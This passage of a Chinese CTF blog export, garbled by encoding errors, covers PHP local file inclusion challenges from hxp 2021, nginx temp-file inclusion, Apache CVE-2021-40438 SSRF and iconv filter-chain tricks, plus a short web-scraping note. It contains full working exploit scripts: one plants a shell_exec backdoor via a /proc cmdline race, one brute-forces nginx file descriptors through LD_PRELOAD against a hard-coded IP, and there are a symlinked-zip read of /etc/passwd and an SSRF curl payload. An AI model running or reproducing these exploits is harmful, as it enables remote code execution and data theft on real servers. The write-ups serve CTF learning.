&quot;+file_name)os.system(&quot;cp /etc/passwd- /etc/passwd&quot;)os.system(&quot;rm -f hi.zip&quot;)os.symlink(file_ln, file_name)os.system(&quot;zip -ry file.zip file\\:/&quot;)req = requests.session()file = {&quot;file&quot;:open(&quot;file.zip&quot;,'rb')}res = req.post(url,files=file)print(&quot;upload success&quot;)print(res.text)res = req.get(url+&quot;?file=&quot;+file_name)print(url+&quot;?file=&quot;+file_name)print(&quot;get file success&quot;)print(res.text) counter&lt;?php$rmf = function($file){ system('rm -f -- '.escapeshellarg($file));};$page = $_GET['page'] ?? 'default';chdir('./data');if(isset($_GET['reset']) &amp;&amp; preg_match('/^[a-zA-Z0-9]+$/', $page) === 1) { $rmf($page);}file_put_contents($page, file_get_contents($page) + 1);include_once($page); çœ‹èµ·æ¥ç®€å•ï¼Œä½†æ˜¯ä¸ä¼šåšçš„é¢˜ç›®ï¼Œçœ‹å®Œwpå¤§æ¦‚æ˜¯ç†è§£äº† å› ä¸ºç³»ç»Ÿå‘½ä»¤ä¼šåˆ›å»ºproc/$PID/cmdlineï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡åŒ…å«è¿™ä¸ªè¿›ç¨‹æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œä½†æ˜¯æˆ‘ä»¬åªèƒ½è¾“å…¥å­—æ¯å’Œæ•°å­—ï¼Œé‚£ä¹ˆæ€ä¹ˆå‘½ä»¤æ‰§è¡Œå¯ä»¥æ‰§è¡Œåªç”±æ•°å­—å­—æ¯ç»„æˆçš„å‘¢ï¼Ÿé‚£å°±æ˜¯base64ç¼–ç ä»¥åçš„å†…å®¹ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨phpfilterçš„base64è§£ç åŒ…å«æ–‡ä»¶åå°±å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œäº†ã€‚ ä½†æ˜¯å¤ç°æ²¡æˆåŠŸï¼Œæ„Ÿè§‰ä»¥æˆ‘ç°åœ¨çš„å®åŠ›æ˜¯åšä¸å‡ºæ¥äº†ã€‚ã€‚ã€‚è´´ä¸€ä¸‹è„šæœ¬ï¼Œä»¥åç ”ç©¶å§ #!/usr/bin/env python3import requests, threading, time,os, base64, re, tempfile, subprocess,secrets, hashlib, sys, random, signalfrom urllib.parse import urlparse,quote_from_bytesdef urlencode(data, safe=''): return quote_from_bytes(data, safe)url = f'http://{sys.argv[1]}:{sys.argv[2]}/'backdoor_name = secrets.token_hex(8) + '.php'secret = secrets.token_hex(16)secret_hash = hashlib.sha1(secret.encode()).hexdigest()print('[+] backdoor_name: ' + backdoor_name, file=sys.stderr)print('[+] secret: ' + secret, file=sys.stderr)code = f&quot;&lt;?php if(sha1($_GET['s'])==='{secret_hash}')echo shell_exec($_GET['c']);&quot;.encode()payload = f&quot;&quot;&quot;&lt;?php if(sha1($_GET['s'])==='{secret_hash}')file_put_contents(&quot;{backdoor_name}&quot;,$_GET['p']);/*&quot;&quot;&quot;.encode()payload_encoded = b'abcdfg' + base64.b64encode(payload)print(payload_encoded)assert re.match(b'^[a-zA-Z0-9]+$', payload_encoded)# check if the payload would work on our local php setupwith tempfile.NamedTemporaryFile() as tmp: tmp.write(b&quot;sh\\x00-c\\x00rm\\x00-f\\x00--\\x00'&quot;+ payload_encoded +b&quot;'&quot;) tmp.flush() o = subprocess.check_output(['php','-r', f'echo file_get_contents(&quot;php://filter/convert.base64-decode/resource={tmp.name}&quot;);']) print(o, file=sys.stderr) assert payload in o os.chdir('/tmp') subprocess.check_output(['php','-r', f'$_GET = [&quot;p&quot; =&gt; &quot;test&quot;, &quot;s&quot; =&gt; &quot;{secret}&quot;]; include(&quot;php://filter/convert.base64-decode/resource={tmp.name}&quot;);']) with open(backdoor_name) as f: d = f.read() assert d == 'test'pid = -1N = 10done = Falsedef worker(i): time.sleep(1) while not done: print(f'[+] starting include worker: {pid + i}', file=sys.stderr) s = f&quot;&quot;&quot;bombardier -c 1 -d 3m '{url}?page=php%3A%2F%2Ffilter%2Fconvert.base64-decode%2Fresource%3D%2Fproc%2F{pid + i}%2Fcmdline&amp;p={urlencode(code)}&amp;s={secret}' &gt; /dev/null&quot;&quot;&quot; os.system(s)def delete_worker(): time.sleep(1) while not done: print('[+] starting delete worker', file=sys.stderr) s = f&quot;&quot;&quot;bombardier -c 8 -d 3m '{url}?page={payload_encoded.decode()}&amp;reset=1' &gt; /dev/null&quot;&quot;&quot; os.system(s)for i in range(N): threading.Thread(target=worker, args=(i, ), daemon=True).start()threading.Thread(target=delete_worker, daemon=True).start()while not done: try: r = requests.get(url, params={ 'page': '/proc/sys/kernel/ns_last_pid' }, timeout=10) print(f'[+] pid: {pid}', file=sys.stderr) if int(r.text) &gt; (pid+N): pid = int(r.text) + 200 print(f'[+] pid overflow: {pid}', file=sys.stderr) os.system('pkill -9 -x bombardier') r = requests.get(f'{url}data/{backdoor_name}', params={ 's' : secret, 'c': f'id; ls -l /; /readflag; rm {backdoor_name}' }, timeout=10) if r.status_code == 200: print(r.text) done = True os.system('pkill -9 -x bombardier') exit() time.sleep(0.5) except Exception as e: print(e, file=sys.stderr)","link":"/2022/01/11/2021hxp/"},{"title":"nginxç¼“å­˜å†™å…¥æ–‡ä»¶","text":"ez_phpè¿™é‡Œç›´æ¥è¯´ä¸€ä¸‹ç»“è®ºå§ è®©åç«¯ php è¯·æ±‚ä¸€ä¸ªè¿‡å¤§çš„æ–‡ä»¶ Fastcgi è¿”å›å“åº”åŒ…è¿‡å¤§ï¼Œå¯¼è‡´ Nginx éœ€è¦äº§ç”Ÿä¸´æ—¶æ–‡ä»¶è¿›è¡Œç¼“å­˜ è™½ç„¶ Nginx åˆ é™¤äº†/var/lib/nginx/fastcgiä¸‹çš„ä¸´æ—¶æ–‡ä»¶ï¼Œä½†æ˜¯åœ¨ /proc/pid/fd/ ä¸‹æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°è¢«åˆ é™¤çš„æ–‡ä»¶ éå† pid ä»¥åŠ fd ï¼Œä½¿ç”¨å¤šé‡é“¾æ¥ç»•è¿‡ PHP åŒ…å«ç­–ç•¥å®Œæˆ LFI æ¥ä¸‹æ¥å°±æ˜¯åˆ†æ­¥éª¤å†™ä¸€ä¸‹è„šæœ¬äº†ï¼Œé¦–å…ˆæ˜¯è®©åç«¯phpè¯·æ±‚ä¸€ä¸ªè¿‡å¤§çš„æ–‡ä»¶ æˆ‘çœ‹äº†ä¸€ä¸‹ï¼Œå…¶ä»–å¸ˆå‚…ä»¬çš„wpéƒ½åŠ ä¸Šäº†ä¸€äº›å­—ç¬¦ï¼Œä»¥æ‰©å¤§æ•´ä¸ªæ–‡ä»¶å¤§å°ï¼Œä½†æ˜¯æˆ‘æ„Ÿè§‰ä¸åŠ å¥½åƒä¹Ÿæ²¡äº‹ï¼Œè§†æƒ…å†µè€Œå®šå§ def uploader(): print('[+] starting uploader') while not done: requests.get(URL, data=open(&quot;hack.so&quot;,&quot;br&quot;).read()) æ¥ä¸‹æ¥å°±æ˜¯çˆ†ç ´pidå’Œfdä½¿å…¶èƒ½å¤Ÿè¢«æˆåŠŸè®¿é—®åˆ°ï¼Œè€Œæˆ‘åœ¨è‡ªå·±çš„æœºå™¨ä¸Šdockeræ˜¯åœ¨10çš„ä½ç½®ï¼Œè€Œåœ¨å…¶ä»–çš„æœåŠ¡å™¨å°±ä¸ä¸€å®šäº†ï¼Œæ‰€ä»¥éœ€è¦ä¸€ä¸ªä¸ªçš„å»çˆ†ç ´ï¼Œä½†å…¶å®åº”è¯¥ä¹Ÿä¸ä¼šç‰¹åˆ«ä¹… è¿™é‡Œæœ‰å‡ ä¸ªç»†èŠ‚è¯´æ˜ä¸€ä¸‹ 1.nginx workeræˆ‘ä»¬æ‰¾çš„æ˜¯nginx workeræ‰€åœ¨çš„procï¼Œè¿™é‡Œæ‰å­˜å‚¨äº†è¢«åˆ é™¤çš„ä¸´æ—¶æ–‡ä»¶çš„fd è€Œè¦æ‰¾åˆ°è¿™ä¸ªprocçš„å€¼åªèƒ½çˆ†ç ´ï¼Œå°±æ˜¯æä¸€ä¸ªä¸€æ ·çš„ç¯å¢ƒï¼Œçœ‹çœ‹dockeré‡Œé¢çš„ç”Ÿæˆpidæ•°å­—æ˜¯å¤šå°‘ï¼Œä½†æ˜¯æˆ‘æ„Ÿè§‰è¿˜æ˜¯è¦ä»0å¼€å§‹æŒ¨ä¸ªçˆ†ç ´æ‰è¡Œ 2.proc/pid/fdè¿™é‡Œçš„fdä¹Ÿæ˜¯éœ€è¦çˆ†ç ´è·å¾—ï¼Œå¤§å°çš„è¯ä¹Ÿæ˜¯ç›´æ¥ä»0å¼€å§‹å§ï¼Œæ„Ÿè§‰å»æ‰¾æˆ–è€…å¯¹æ¯”çš„è¯ï¼Œå…¶å®æ¯”è¾ƒéš¾æ‰¾åˆ° 3.å¤šçº¿ç¨‹çˆ†ç ´è€Œè¿™é‡Œè„šæœ¬çš„ç¼–å†™ä¸ºäº†æé«˜å‘½ä¸­ç‡ï¼Œä¹Ÿæ˜¯æ¨èå¤šçº¿ç¨‹çˆ†ç ´ï¼Œåœ¨ä¸Šä¼ å®Œæ–‡ä»¶çš„åŒæ—¶ï¼Œå»åŒ…å«å¤šä¸ªpidï¼Œæé«˜å‘½ä¸­ç‡ def bruter(): pid=10 while True: print(f'[+] brute loop restarted: {pid}') for fd in range(4, 32): f = f'/proc/{pid}/fd/{fd}' r = requests.get(URL, params={ 'env': f&quot;LD_PRELOAD={f}&quot;, }) å®Œæ•´expimport sys, threading, requests# exploit PHP local file inclusion (LFI) via nginx's client body buffering assistance# see https://bierbaumer.net/security/php-lfi-with-nginx-assistance/ for detailsURL = 'http://110.42.133.120:1234/index.php'done = False# upload a big client body to force nginx to create a /var/lib/nginx/body/$Xdef uploader(): print('[+] starting uploader') while not done: requests.get(URL, data=open(&quot;hack.so&quot;,&quot;br&quot;).read())for _ in range(16): t = threading.Thread(target=uploader) t.start()# brute force nginx's fds and pidsdef bruter(): pid=10 while True: print(f'[+] brute loop restarted: {pid}') for fd in range(4, 32): f = f'/proc/{pid}/fd/{fd}' r = requests.get(URL, params={ 'env': f&quot;LD_PRELOAD={f}&quot;, })a = threading.Thread(target=bruter)a.start() counterè¿™ä¸ªä¹Ÿæ˜¯hxpçš„é¢˜ï¼Œç„¶åä¹Ÿæ˜¯æˆ‘æ²¡é‡åˆ°è¿‡çš„å§¿åŠ¿ï¼Œä¹Ÿå­¦ä¹ ä¸‹ï¼Œæ„Ÿè§‰ &lt;?phpdeclare(strict_types=1);$rand_dir = 'files/'.bin2hex(random_bytes(32));mkdir($rand_dir) || die('mkdir');putenv('TMPDIR='.__DIR__.'/'.$rand_dir) || die('putenv');echo 'Hello '.$_POST['name'].' your sandbox: '.$rand_dir.&quot;\\n&quot;;try { if (stripos(file_get_contents($_POST['file']), '&lt;?') === false) { include_once($_POST['file']); }}finally { system('rm -rf '.escapeshellarg($rand_dir));} æºç åœ¨è¿™é‡Œï¼Œåˆ†æä¹‹ç±»çš„è¿‡ç¨‹å°±çœç•¥äº†ï¼Œç›´æ¥è¯´ç»“è®ºä»¥åŠå­˜åœ¨çš„æ¼æ´ç‚¹ 1. å…¶ä¸­é…ç½®æ–‡ä»¶æœ‰ä¸€ä¸ªæ¯”è¾ƒæ˜æ˜¾çš„é…ç½®é”™è¯¯ï¼š location /.well-known { autoindex on; alias /var/www/html/well-known/;} å¼€å¯äº†åˆ—ç›®å½•å¹¶ä¸”æˆ‘ä»¬å¯ä»¥éå†åˆ°ä¸Šå±‚æ–‡ä»¶å¤¹ã€‚ 2.compress.zip://æµè¿›è¡Œä¸Šä¼ ä»»æ„æ–‡ä»¶ï¼Œä½†æ˜¯äº§ç”Ÿçš„æ˜¯ä¸´æ—¶æ–‡ä»¶ï¼Œä¸ºäº†èƒ½å¤Ÿå°½å¯èƒ½é•¿æ—¶é—´çš„ç•™åœ¨æœåŠ¡å™¨ä¸Šï¼Œæˆ‘ä»¬éœ€è¦è®©ä»–åœç•™æ—¶é—´ä¹…ä¸€ç‚¹ ä½¿ç”¨å¤§æ–‡ä»¶ä¼ è¾“ï¼Œè¿™æ ·åœ¨ä¼ è¾“çš„æ—¶å€™å°±ä¼šæœ‰ä¸€å®šçš„æ—¶é—´è®©æˆ‘ä»¬åŒ…å«åˆ°æ–‡ä»¶äº†ã€‚ ä½¿ç”¨ FTP é€Ÿåº¦æ§åˆ¶ï¼Œå¤§æ–‡ä»¶ä¼ è¾“æ ¹æœ¬ä¸Šè¿˜æ˜¯ä¼ è¾“é€Ÿåº¦çš„é—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€äº›æ–¹å¼é™åˆ¶ä¼ è¾“é€Ÿç‡ï¼Œæ¯”è¾ƒç®€å•çš„ä¹Ÿå¯ä»¥åˆ©ç”¨compress.zlib://ftp://å½¢å¼ï¼Œæ§åˆ¶ FTP é€Ÿåº¦å³å¯ 3.bypass waf if (stripos(file_get_contents($_POST['file']), '&lt;?') === false) { include_once($_POST['file']); } è¿™é‡Œ åˆ©ç”¨httpé•¿é“¾æ¥çš„å½¢å¼ï¼Œåˆ©ç”¨striposå’Œinclude_oneä¹‹é—´çš„æ—¶é—´çª—è¿›è¡Œç»•è¿‡ï¼Œå…·ä½“æ¥è¯´æ˜¯é¦–å…ˆå‘é€ ä¸€æ®µé•¿æ•°æ®ï¼Œåœ¨é€šè¿‡striposçš„æ£€æŸ¥åï¼Œéšå³å†å‘é€phpä»£ç ï¼Œå³å¯é€šè¿‡ 4.è·å–æ²™ç®±è·¯å¾„ æˆ‘ä»¬éœ€è¦é€šè¿‡ä¼ å…¥è¿‡å¤§çš„ name å‚æ•°ï¼Œå¯¼è‡´ PHP output buffer æº¢å‡ºï¼Œåœ¨ä¿æŒè¿æ¥çš„æƒ…å†µä¸‹è·å–æ²™ç®±è·¯å¾„ï¼Œå‚è€ƒä»£ç ï¼š æ¥ä¸‹æ¥å°±æ˜¯å†™ä¸€ä¸‹è„šæœ¬äº† æ„Ÿè§‰è‡ªå·±å¯¹æ•´ä¸ªæµç¨‹è¿˜æ˜¯å¾ˆæ‡µé€¼ï¼Œç†ä¸€ä¸‹å§ï¼Œå…ˆç•™ä¸€ä¸‹å‘å§ï¼Œæ²¡ææ‡‚é‚£äº›portæ˜¯åœ¨å¹²å•¥â€“ https://balsn.tw/ctf_writeup/20191228-hxp36c3ctf/#includer","link":"/2022/02/04/2021hxp-LFI/"},{"title":"apache cve 2021-40438","text":"å‰è¨€åšé¢˜é‡åˆ°äº†ï¼Œä½†æ˜¯å‘ç°ä¸ç†è§£çš„è¯ï¼Œåšä¸äº†é¢˜ URLä¸­çš„Hostname VS RequestHeaderä¸­çš„Hostå­—æ®µhttp://hostname:port_noæŠ¥æ–‡ä¸­:host: xxxx.xx proxypass&lt;VirtualHost *&gt; ServerAdmin webmaster@localhost ServerName localhost DocumentRoot /usr/local/apache2/htdocs LogLevel notice proxy:trace8 ErrorLog /usr/local/apache2/logs/error.log CustomLog /usr/local/apache2/logs/access.log combined ProxyPass / &quot;http://localhost:4554/&quot; ProxyPassReverse / &quot;http://localhost:4554/&quot;&lt;/VirtualHost&gt; payload http://localhost:80/?unix:(A*4096)|http://localhost:7891/ è¿‡ç¨‹æ¼æ´ç‚¹æ¼æ´ç‚¹å‡ºç°åœ¨proxy_utils.cä¸­çš„fix_uds_filenameå‡½æ•°ä¸­å¯¹urlè¿‡æ»¤çš„ä¸ä¸¥æ ¼ï¼Œä»¥åŠå¯¹é”™è¯¯å¤„ç†çš„é€»è¾‘å­˜åœ¨é—®é¢˜å¯¼è‡´çš„ssrfæ¼æ´ 1.ä¼ å…¥fix_uds_filenameurlçš„hostnameå·²ç»è¢«mod_proxyæ¨¡å—é‡æ–°ä¿®æ”¹ä¸ºé…ç½®æ–‡ä»¶ä¸­æŒ‡å®šçš„åç«¯`hostname(http://localhost:4554/)ï¼ˆåœ¨æœ¬é¢˜ä¸­:ç›¸å½“äºæ­¤æ—¶æ˜¯www.geogle.com?xxxï¼‰ 2.fix_uds_filenameå‡½æ•°çš„æœ¬æ„ä¸»è¦æ˜¯ç”¨äºå¤„ç†å½¢å¦‚unix:/home/www.socket|http://localhost/whatever/å«æœ‰unixå¥—æ¥å­—çš„è¯·æ±‚ 3.åœ¨ç¬¬äºŒä¸ªifæ¡ä»¶ä¸­ï¼Œfix_uds_filenameé¦–å…ˆåˆ¤æ–­äº†r-&gt;filenameçš„å¼€å¤´æ˜¯å¦ä¸ºproxy: 4.æ¥ç€å°†r-&gt;filenameåˆ†ä¸ºäº†ptrå’Œptr2ä¸¤éƒ¨åˆ†ï¼Œptr2æ ¹æ®unix:å…³é”®å­—å¯¹urlè¿›è¡Œåˆ’åˆ†ï¼Œptråˆ™æ ¹æ®|ç¬¦å·ï¼Œä»ptr2ä¸­è¿›ä¸€æ­¥åˆ’åˆ†ï¼Œæå–ç›®æ ‡urlå¹¶èµ‹å€¼ç»™å˜é‡rurlã€‚ 5.è€Œr-&gt;filenameæ¥æºäºproxy_http_canonå‡½æ•°ã€‚è¿™ä¸ªå‡½æ•°ä¸»è¦çš„åŠŸèƒ½æ˜¯å°†ä¼ å…¥çš„urlè¿›è¡Œè§£æï¼Œå¹¶æ‹†åˆ†ä¸ºschemeï¼Œhostï¼Œportï¼Œpathï¼Œå’Œquery_argsï¼ˆsearchï¼‰ç­‰éƒ¨åˆ†ï¼Œæœ€åæ‹¼æ¥&quot;proxy:&quot;, scheme, &quot;://&quot;, host, sport,&quot;/&quot;, path, (search)ï¼Œèµ‹å€¼ç»™r-&gt;filename,æ­¤å€¼æ¥æºäºä»¥ä¸‹éƒ¨åˆ† æ­¤æ—¶schema=http:host=localhostsport=:4554path=(search) 7.å›åˆ°fix_uds_filenameå‡½æ•°ï¼Œåœ¨å¯¹r-&gt;filenameè¿›è¡Œæ‹†åˆ†åï¼Œæ¥ä¸‹æ¥å°±æ˜¯æœ¬æ¬¡æ¼æ´æœ€æ ¸å¿ƒçš„éƒ¨åˆ†uds_pathçš„èµ‹å€¼æ“ä½œã€‚è¿™é‡Œä½¿ç”¨ap_runtime_dir_relativeå¯¹urisock.pathè¿›è¡Œå¤„ç†ï¼Œå¹¶å°†ç»“æœèµ‹å€¼ç»™sockpathï¼Œä»¥é”®å€¼å¯¹çš„å½¢å¼ï¼ˆusd_path: sockpathï¼‰å­˜å‚¨åˆ°r-&gt;notesä¸­ã€‚ 8.è·Ÿè¿›ap_runtime_dir_relativeå‡½æ•°ï¼Œè¿™é‡Œå¼•ç”¨äº†arpåº“ä¸­çš„apr_filepath_mergeå‡½æ•°ã€‚æœ›æ–‡ç”Ÿä¹‰ï¼Œè¿™ä¸ªå‡½æ•°æ˜¯ç”¨æ¥å¤„ç†æ–‡ä»¶è·¯å¾„çš„åˆå¹¶æ“ä½œçš„ã€‚è€Œä¼ å…¥è¯¥å‡½æ•°çš„ä¸¤ä¸ªé‡è¦å‚æ•°ï¼šruntime_dir = &quot;/usr/local/apache2/logs&quot;, file = urisock.pathã€‚ 9.apr_filepath_mergeå‡½æ•°è®¡ç®—äº†strlen(rootpath) + strlen(addpath) + 4çš„å€¼ï¼Œå¹¶ä¸APR_PATH_MAXä½œæ¯”è¾ƒã€‚å¦‚æœæ¯”APR_PATH_MAXå¤§ï¼Œåˆ™è¿”å›APR_ENAMETOOLONGå¸¸é‡ã€‚è¿™ä½¿å¾—ä¸Šé¢ap_runtime_dir_relativeåœ¨å¤„ç†å®Œè·¯å¾„åï¼Œè¿”å›çš„rvçŠ¶æ€ä¸ä¸ºifæ¡ä»¶ä¸­çš„çŠ¶æ€ï¼Œä»è€Œè¿›å…¥elseåˆ†æ”¯ï¼Œè¿”å›NULLã€‚ æ­¤æ—¶rootpathå°±æ˜¯runtime_dirä¼ å…¥çš„å€¼ 10.APR_PATH_MAXå®šä¹‰åœ¨arp.hå¤´æ–‡ä»¶ä¸­ï¼Œè€Œåœ¨linuxç³»ç»Ÿä¸Šï¼ŒPATH_MAXå®šä¹‰åœ¨linux/limits.hä¸­ï¼Œå€¼ä¸º4096ã€‚å› æ­¤éœ€è¦å¡«å……çš„addpathçš„æœ€å°é•¿åº¦ä¸º4096 - strlen(rootpath) - 4 = 4069ã€‚ 11.æ¥ä¸‹æ¥ï¼Œåœ¨ap_proxy_determine_connectionå‡½æ•°ä¸­å¯¹uds_pathè¿›è¡Œäº†åˆå§‹åŒ–ã€‚è¿™é‡Œæˆ‘å°†æ¯”è¾ƒå…³é”®çš„å˜é‡éƒ½åŠ å…¥åˆ°å·¦è¾¹çš„è°ƒè¯•çª—å£ä¸­ã€‚å¯ä»¥çœ‹åˆ°ï¼Œ*worker-&gt;s-&gt;uds_pathæœ€å¼€å§‹å¹¶æ²¡æœ‰è¢«åˆå§‹åŒ–ï¼Œå› æ­¤uds_path = apr_table_get(r-&gt;notes, &quot;uds_path&quot;)ã€‚è€Œè¿™é‡Œï¼Œæ°æ°æ˜¯åœ¨fix_uds_filenameä¸­è®¾ç½®è¿‡çš„é”®å€¼å¯¹ 12.å¦‚æœè¿™é‡Œçš„uds_path != nullï¼Œé‚£ä¹ˆå°±ä¼šä½¿ç”¨unix socketè¿›è¡Œååºçš„é€šä¿¡ã€‚å› æ­¤ä½œè€…åœ¨fix_uds_filenameå‡½æ•°ä¸­é€šè¿‡ä½¿ç”¨è¶…é•¿çš„payloadè¿™æ ·å·§å¦™çš„æ–¹æ³•æ¥è®¾ç½®uds_path = nullçš„åŸå› å°±åœ¨äºæ­¤ã€‚åªè¦uds_path = nullï¼Œé‚£ä¹ˆå°±ä¼šè¿›å…¥2553è¡Œçš„elseåˆ†æ”¯ï¼Œä¹Ÿå°±å›é€€åˆ°tcpè¿æ¥ã€‚ 13.æ­¤æ—¶conn-&gt;hostnameå’Œconn-&gt;portéƒ½ç”±uri-&gt;hostnameå’Œuri-&gt;portè¿›è¡Œæ§åˆ¶ã€‚åœ¨æ­¤ä¹‹å‰ï¼Œå·²ç»è°ƒç”¨è¿‡apr_uri_parseå¤„ç†urlï¼Œå¾—åˆ°çš„hostnameå’Œportæ­£æ˜¯|åçš„ç›®æ ‡urlï¼Œè€Œè¿™éƒ¨åˆ†å†…å®¹æ­£æ˜¯æ”»å‡»è€…å¯æ§çš„ï¼Œå› æ­¤é€ æˆäº†ssrfæ¼æ´ã€‚ payloadå¤„ç†è¿‡ç¨‹åˆ†æpayload http://localhost:80/?unix:(A*4096)|http://localhost:7891/ ä¼ å…¥ä»¥åå˜æˆ http://proxypass/?unix:(A*4096)|http://localhost:7891/ ç„¶åç»è¿‡ç”±äºunixè¿‡é•¿ï¼Œå†æ¬¡æå–ï¼Œè®¿é—®ä»¥ä¸‹å†…å®¹ http://localhost:7891/ payload curl --header 'Host: geogle.com' &quot;http://httpd.summ3r.top:60010/proxy?unix:$(python3 -c 'print(&quot;A&quot;*4901, end=&quot;&quot;)')|http://internal.host/flag&quot;","link":"/2022/01/29/apache-cve-2021-40438/"},{"title":"æ¸—é€æµ‹è¯•â€”â€”å†…ç½‘ä»£ç†","text":"","link":"/2021/12/12/frp%E9%85%8D%E7%BD%AE/"},{"title":"pythonçˆ¬è™«æ•°æ®åˆ†æ","text":"beautifulsoupfrom bs4 import BeautifulSoupfile=open(&quot;./xxx.html&quot;,&quot;rb&quot;)htm=file.read().decode('utf-8')bs=BeautifulSoup(html,&quot;html.parser&quot;) æ ‡ç­¾åŠå…¶å†…å®¹ï¼›æ‹¿åˆ°å®ƒæ‰€æ‰¾åˆ°çš„ç¬¬ä¸€ä¸ªå†…å®¹ print(bs.title) åªè¦å†…å®¹ä¸è¦æ ‡ç­¾ print(bs.title.string) bs.a.attrs è·å–aæ ‡ç­¾çš„æ‰€æœ‰çš„å±æ€§ï¼Œè¿”å›ä¸€ä¸ªå­—å…¸bs.a è·å–aæ ‡ç­¾çš„æ‰€æœ‰çš„å±æ€§ï¼Œè¿”å›ä¸€ä¸ªå­—å…¸print(bs.a.sting)#comment æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„navigablestringï¼Œè¾“å‡ºçš„å†…å®¹ 3.Beautifulsoup è¡¨ç¤ºæ•´ä¸ªæ–‡æ¡£ print(bs.attrs) éå†æ­£åˆ™ bs.find_all(re.conpile(&quot;a&quot;)) find_all()t_list=bs.find_all(&quot;a&quot;)import ret_list=bs.find_all(re.compile(&quot;a&quot;))def name_is_exists(tag): return tag.has_attr(&quot;name&quot;)t_list=bs.find_all(name_is_exists) CSSé€‰æ‹©å™¨print(bs.select('title')) é€šè¿‡æ ‡ç­¾æŸ¥æ‰¾print(bs.select(&quot;.mnav&quot;)) é€šè¿‡ç±»åæ¥æŸ¥æ‰¾print(bs.select(#u1)) é€šè¿‡idæ¥æŸ¥æ‰¾print(bs.select(a[class='bri'])) é€šè¿‡å±æ€§æ¥æŸ¥æ‰¾print(bs.select(&quot;head &gt; title&quot;) é€šè¿‡å­æ ‡ç­¾print(bs.select(&quot;.mnav ~ .bri&quot;)","link":"/2021/12/20/python%E7%88%AC%E8%99%AB%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/"},{"title":"the-end-of-LFI","text":"å‰è¨€åœ¨hxpä¸­å‡ºäº†ä¸¤é¢˜LFIçš„é¢˜ç›®ï¼Œè¿™ä¸ªè§£æ³•æ„Ÿè§‰æ˜¯å¤©èŠ±æ¿äº†ï¼Œè·Ÿç€å¤§ä½¬çš„åšå®¢å­¦ä¸€æ‰‹ PHP base64 filteråœ¨ p ç‰›ç»•è¿‡æ­»äº¡ exit çš„æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬çŸ¥é“ å¯¹PHP Base64 Filter æ¥è¯´ï¼Œä¼šå¿½ç•¥æ‰éæ­£å¸¸ç¼–ç çš„å­—ç¬¦ æ‰€ä»¥ï¼Œå½“$contentè¢«åŠ ä¸Šäº†&lt;?php exit; ?&gt;ä»¥åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ php://filter/write=convert.base64-decode æ¥é¦–å…ˆå¯¹å…¶è§£ç ã€‚åœ¨è§£ç çš„è¿‡ç¨‹ä¸­ï¼Œå­—ç¬¦&lt;ã€?ã€;ã€&gt;ã€ç©ºæ ¼ç­‰ä¸€å…±æœ‰7ä¸ªå­—ç¬¦ä¸ç¬¦åˆbase64ç¼–ç çš„å­—ç¬¦èŒƒå›´å°†è¢«å¿½ç•¥ï¼Œæ‰€ä»¥æœ€ç»ˆè¢«è§£ç çš„å­—ç¬¦ä»…æœ‰â€œphpexitâ€å’Œæˆ‘ä»¬ä¼ å…¥çš„å…¶ä»–å­—ç¬¦ã€‚ è€Œåˆæ³•å­—ç¬¦çš„å®šä¹‰ä¸º A-Za-z0-9\\/\\=\\+ è¿™é‡Œæœ‰ä¸ªç®€å•çš„éªŒè¯ &lt;?php$a = &quot;\\x1bY\\xffQ\\xfa&quot;; //YQ ä¸º a çš„ base64 ç¼–ç var_dump(base64_decode($a));// string(1) &quot;a&quot; Iconv LFIincludeä¸€å¥è¯getshellæœ‰ä¸ªæ–‡ä»¶å†…å®¹ä¸º&lt;? php phpinfo();?&gt;çš„base64ç¼–ç å†…å®¹ï¼Œå½“æˆ‘ä»¬å°è¯•includeçš„æ—¶å€™å°±å¯ä»¥æˆåŠŸæ‰§è¡Œäº† include &quot;php://filter/convert.base64-decode/resource=./e&quot;;// the content of e: PD9waHAgcGhwaW5mbygpOw==// base64 code of `&lt;?php phpinfo();` is: PD9waHAgcGhwaW5mbygpOw== (without the backquote) trickincludeå‡½æ•°åŒ…å«çš„æ˜¯base64è§£ç ä»¥åçš„phpä»£ç ï¼Œè€Œåœ¨php fiterä¸­æœ‰ä¸€ç§convert.iconvçš„filterï¼Œå¯ä»¥å°†æ•°æ®é›†ä»å­—ç¬¦é›†Aè½¬åŒ–ä¸ºå­—ç¬¦é›†Bï¼Œç»“åˆè¿™ç§filterï¼Œè½¬åŒ–ä¸€äº›å›ºå®šçš„æ–‡ä»¶å†…å®¹ï¼Œç»è¿‡base64è§£ç ä»¥åè·å¾—æˆ‘ä»¬çš„getshellï¼Œè€Œç”±äºphp base64çš„å®½æ¾å‹ï¼Œå°½ç®¡æˆ‘ä»¬äº§ç”Ÿäº†ä¸å¯è§çš„å­—ç¬¦ï¼ˆåƒåœ¾å­—ç¬¦ï¼‰ï¼Œä¹Ÿå°†ä¼šè¢«ç›´æ¥å»æ‰ã€‚ ä¾‹å­å‡å®šæˆ‘ä»¬éœ€è¦æ–‡ä»¶å†…å®¹ä¸º14ä¸ªaå­—ç¬¦ï¼Œé¦–å…ˆéå†iconvæ”¯æŒçš„å­—ç¬¦ç¼–ç å½¢å¼ $url = &quot;php://filter/&quot;;$url .= &quot;convert.iconv.UTF8.CSISO2022KR&quot;;$url .= &quot;/resource=data://,aaaaaaaaaaaaaa&quot;; //æˆ‘ä»¬è¿™é‡Œç®€å•ä½¿ç”¨ `data://` æ¥æ¨¡æ‹Ÿæ–‡ä»¶å†…å®¹è¯»å–ã€‚var_dump(file_get_contents($url));// hexdump:// 00000000 73 74 72 69 6e 67 28 31 38 29 20 22 1b 24 29 43 |string(18) &quot;.$)C|// 00000010 61 61 61 61 61 61 61 61 61 61 61 61 61 61 22 0a |aaaaaaaaaaaaaa&quot;.| æˆ‘ä»¬çœ‹åˆ°æœ€ç»ˆçš„è¾“å‡ºç»“æœæœ‰åƒåœ¾å­—ç¬¦ï¼Œè¿˜æœ‰ä¸€ä¸ªCè¿˜æœ‰æˆ‘ä»¬éœ€è¦çš„å†…å®¹aï¼Œè€Œå¦‚æœç›´æ¥ç»è¿‡base64ç¼–ç 